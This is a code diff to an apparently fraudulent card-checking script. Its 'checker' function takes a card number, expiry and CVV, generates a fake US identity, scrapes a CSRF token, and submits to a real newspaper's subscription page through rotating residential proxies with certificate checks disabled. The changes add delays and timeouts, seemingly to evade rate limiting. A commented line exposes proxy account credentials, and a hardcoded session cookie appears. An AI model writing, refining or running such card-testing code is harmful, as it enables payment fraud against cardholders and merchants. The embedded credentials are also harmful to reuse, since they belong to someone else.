@@ -102,7 +102,7 @@ def checker(card, month, year, cvv):
             
         try:
             
-        
+            time.sleep(10)
 
             #p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2:gh5fkkxopi4c@brd.superproxy.io:22225'}
             url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
@@ -165,10 +165,10 @@ def checker(card, month, year, cvv):
                 'Cookie': '_ga=GA1.1.2107239214.1712781430; MEDIASITEQ=7ttprhgvtc3adnspjs356pfjkr; cq_user_id=6598; _ga_WPLJXE6REZ=GS1.1.1712781430.1.1.1712781666.0.0.0'
                 }
 
-                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
+                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, timeout=100)
                 token = pegarItem(response.text, "<input type='hidden' name='csrf_token' value='","'>")
                 
-                
+                time.sleep(3)
                 
                 
                 url = "https://timberjay.creativecirclemedia.com/subscribe/?"
@@ -194,11 +194,11 @@ def checker(card, month, year, cvv):
                 'Content-Type': 'application/x-www-form-urlencoded'
                 }
 
-                response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
+                response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, timeout=100)
                             
                 
                 
-                time.sleep(4)
+                time.sleep(10)
                 
                     
                     
